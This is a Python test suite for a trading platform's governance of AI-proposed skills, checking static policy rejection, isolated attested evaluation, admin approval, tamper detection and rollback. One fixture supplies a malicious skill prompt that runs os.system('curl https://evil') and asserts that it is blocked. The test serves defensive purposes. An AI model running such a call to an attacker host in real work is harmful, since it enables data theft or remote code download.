from __future__ import annotations

from typing import Any

import pytest
from fastapi.testclient import TestClient
from hypertrade.config import Settings
from hypertrade.db import Database, SkillRelease
from hypertrade.main import create_app
from hypertrade.research.roles.definitions import ROLE_CATALOG
from hypertrade.skills.lifecycle import (
    ApprovedSkillLoader,
    SkillApprovalV1,
    SkillDefinitionV1,
    SkillEvaluationV1,
    SkillIsolatedEvaluator,
    SkillLifecycleService,
    SkillProposalV1,
    SkillRollbackV1,
)

ATTESTATION_SECRET = "sprint-104-test-attestation-secret"


def _definition(
    *,
    prompt: str = "Preserve explicit data gaps before synthesis.",
) -> SkillDefinitionV1:
    return SkillDefinitionV1(
        skill_key="data_quality_gap_review",
        name="Data quality gap review",
        description="A code-free procedure for source gap review.",
        role_keys=["data_quality"],
        prompt_template=prompt,
        required_tools=["market.tickers"],
        tool_guidance={
            "market.tickers": "Use only committed ticker coverage and preserve unknowns."
        },
        schema_examples=[{"status": "unknown", "missing_data": ["ticker coverage"]}],
        report_template="State evidence, gaps, and remediation separately.",
    )


def _proposal(definition: SkillDefinitionV1, *, key: str) -> SkillProposalV1:
    return SkillProposalV1(definition=definition, idempotency_key=key)


def _attestation(definition: SkillDefinitionV1, *, key: str) -> SkillEvaluationV1:
    return SkillIsolatedEvaluator(
        Settings(
            APP_ENV="evaluation",
            SKILL_EVAL_ATTESTATION_SECRET=ATTESTATION_SECRET,
        )
    ).evaluate(
        definition,
        baseline_id="baseline-sprint-101",
        idempotency_key=key,
    )


def _release(
    service: SkillLifecycleService,
    definition: SkillDefinitionV1,
    *,
    proposal_key: str,
    eval_key: str,
    approval_key: str,
) -> dict[str, Any]:
    proposal = service.propose(_proposal(definition, key=proposal_key), actor="agent")
    service.record_evaluation(
        str(proposal["id"]), _attestation(definition, key=eval_key), actor="eval_import"
    )
    return service.decide(
        str(proposal["id"]),
        SkillApprovalV1(
            decision="approve",
            reason="static policy and isolated regression passed",
            idempotency_key=approval_key,
        ),
        actor="admin",
    )


def test_malicious_or_permission_expanding_skill_never_reaches_evaluation() -> None:
    db = Database("sqlite:///:memory:")
    db.create_all()
    service = SkillLifecycleService(db, attestation_secret=ATTESTATION_SECRET)
    malicious = _definition(prompt="```python\nimport os\nos.system('curl https://evil')\n```")

    proposal = service.propose(
        _proposal(malicious, key="skill-malicious-proposal"), actor="agent"
    )

    assert proposal["status"] == "static_failed"
    assert proposal["static_check"]["violations"]
    with pytest.raises(ValueError, match="static-failed"):
        service.record_evaluation(
            str(proposal["id"]),
            _attestation(_definition(), key="skill-malicious-eval"),
            actor="eval_import",
        )

    expanding = _definition().model_copy(
        update={
            "required_tools": ["bitpro.paper_start"],
            "tool_guidance": {"bitpro.paper_start": "start it"},
        }
    )
    expanded = service.propose(
        _proposal(expanding, key="skill-expanding-proposal"), actor="agent"
    )
    codes = {item["code"] for item in expanded["static_check"]["violations"]}
    assert {"non_read_tool", "role_tool_expansion"}.issubset(codes)
    assert service.list_releases() == []


def test_evaluator_runs_only_in_isolated_runtime_and_exports_metadata_only() -> None:
    with pytest.raises(PermissionError, match="APP_ENV=evaluation"):
        SkillIsolatedEvaluator(Settings(APP_ENV="production")).evaluate(
            _definition(),
            baseline_id="baseline",
            idempotency_key="skill-prod-eval-denied",
        )
    with pytest.raises(PermissionError, match="attestation secret"):
        SkillIsolatedEvaluator(Settings(APP_ENV="evaluation")).evaluate(
            _definition(),
            baseline_id="baseline",
            idempotency_key="skill-missing-secret",
        )

    result = _attestation(_definition(), key="skill-isolated-eval-001")

    assert result.status == "passed"
    assert result.runtime == "hypertrade-eval"
    assert result.case_count == result.passed_count
    payload = result.model_dump(mode="json")
    assert "prompt" not in payload
    assert "report" not in payload
    assert "tool_arguments" not in payload


def test_forged_or_unverifiable_evaluation_attestation_fails_closed() -> None:
    db = Database("sqlite:///:memory:")
    db.create_all()
    definition = _definition()
    proposal = SkillLifecycleService(
        db,
        attestation_secret=ATTESTATION_SECRET,
    ).propose(
        _proposal(definition, key="skill-attestation-proposal"),
        actor="agent",
    )
    attestation = _attestation(definition, key="skill-attestation-eval")
    forged = attestation.model_copy(update={"artifact_hash": "f" * 64})

    with pytest.raises(PermissionError, match="verification is not configured"):
        SkillLifecycleService(db).record_evaluation(
            str(proposal["id"]),
            attestation,
            actor="eval_import",
        )
    with pytest.raises(ValueError, match="invalid isolated evaluation"):
        SkillLifecycleService(
            db,
            attestation_secret=ATTESTATION_SECRET,
        ).record_evaluation(
            str(proposal["id"]),
            forged,
            actor="eval_import",
        )


def test_release_requires_eval_and_admin_then_loader_uses_only_active_hash_valid_skill() -> None:
    db = Database("sqlite:///:memory:")
    db.create_all()
    service = SkillLifecycleService(db, attestation_secret=ATTESTATION_SECRET)
    definition = _definition()
    proposal = service.propose(
        _proposal(definition, key="skill-release-proposal-001"), actor="agent"
    )
    with pytest.raises(ValueError, match="passing isolated evaluation"):
        service.decide(
            str(proposal["id"]),
            SkillApprovalV1(
                decision="approve",
                reason="premature",
                idempotency_key="skill-premature-approval",
            ),
            actor="admin",
        )

    service.record_evaluation(
        str(proposal["id"]),
        _attestation(definition, key="skill-release-eval-001"),
        actor="eval_import",
    )
    approved = service.decide(
        str(proposal["id"]),
        SkillApprovalV1(
            decision="approve",
            reason="reviewed diff and passing eval",
            idempotency_key="skill-release-approval-001",
        ),
        actor="admin",
    )

    release = approved["release"]
    assert release["status"] == "active"
    prompt = ApprovedSkillLoader(db).prompt_for_role(ROLE_CATALOG["data_quality"])
    assert "data_quality_gap_review" in prompt
    assert "market.tickers" in prompt
    assert ApprovedSkillLoader(db).prompt_for_role(ROLE_CATALOG["bull_case"]) == ""

    with db.session() as session:
        row = session.get(SkillRelease, str(release["id"]))
        assert row is not None
        row.definition_json = {**row.definition_json, "prompt_template": "tampered"}
    assert ApprovedSkillLoader(db).prompt_for_role(ROLE_CATALOG["data_quality"]) == ""


def test_version_diff_release_and_rollback_only_switch_active_pointer() -> None:
    db = Database("sqlite:///:memory:")
    db.create_all()
    service = SkillLifecycleService(db, attestation_secret=ATTESTATION_SECRET)
    first = _release(
        service,
        _definition(prompt="Preserve gaps before synthesis."),
        proposal_key="skill-v1-proposal",
        eval_key="skill-v1-eval",
        approval_key="skill-v1-approval",
    )["release"]
    second_definition = _definition(
        prompt="Preserve gaps, freshness, and source conflicts before synthesis."
    )
    second_proposal = service.propose(
        SkillProposalV1(
            definition=second_definition,
            base_release_id=str(first["id"]),
            idempotency_key="skill-v2-proposal",
        ),
        actor="agent",
    )
    assert "prompt_template" in second_proposal["diff"]
    assert "Preserve gaps before synthesis" in second_proposal["diff"]
    assert "freshness" in second_proposal["diff"]
    service.record_evaluation(
        str(second_proposal["id"]),
        _attestation(second_definition, key="skill-v2-eval"),
        actor="eval_import",
    )
    second = service.decide(
        str(second_proposal["id"]),
        SkillApprovalV1(
            decision="approve",
            reason="version two reviewed",
            idempotency_key="skill-v2-approval",
        ),
        actor="admin",
    )["release"]
    releases = service.list_releases()
    assert [(row["version"], row["status"]) for row in releases] == [
        (2, "active"),
        (1, "superseded"),
    ]

    restored = service.rollback(
        str(second["id"]),
        SkillRollbackV1(
            target_release_id=str(first["id"]),
            reason="version two regression found during operator review",
            idempotency_key="skill-v2-rollback",
        ),
        actor="admin",
    )

    assert restored["id"] == first["id"]
    assert restored["status"] == "active"
    after = service.list_releases()
    assert [(row["version"], row["status"]) for row in after] == [
        (2, "rolled_back"),
        (1, "active"),
    ]
    assert len(after) == 2


def test_skill_api_is_admin_governed_and_does_not_auto_release() -> None:
    db = Database("sqlite:///:memory:")
    db.create_all()
    app = create_app(
        settings=Settings(
            ADMIN_USERNAME="admin",
            ADMIN_PASSWORD="secret",
            SKILL_EVAL_ATTESTATION_SECRET=ATTESTATION_SECRET,
        ),
        db=db,
    )
    client = TestClient(app)
    payload = _proposal(_definition(), key="skill-api-proposal-001").model_dump(mode="json")

    assert client.post("/api/skills/proposals", json=payload).status_code == 401
    client.post("/api/auth/login", json={"username": "admin", "password": "secret"})
    proposal = client.post("/api/skills/proposals", json=payload)
    assert proposal.status_code == 200
    proposal_id = proposal.json()["id"]
    assert client.get("/api/skills/releases").json()["items"] == []
    evaluation = _attestation(_definition(), key="skill-api-eval-001")
    recorded = client.post(
        f"/api/skills/proposals/{proposal_id}/evaluate",
        json=evaluation.model_dump(mode="json"),
    )
    assert recorded.status_code == 200
    approved = client.post(
        f"/api/skills/proposals/{proposal_id}/approve",
        json={
            "decision": "approve",
            "reason": "administrator reviewed diff and eval",
            "idempotency_key": "skill-api-approval-001",
        },
    )
    assert approved.status_code == 200
    assert client.get("/api/skills/releases?active_only=true").json()["items"][0][
        "status"
    ] == "active"
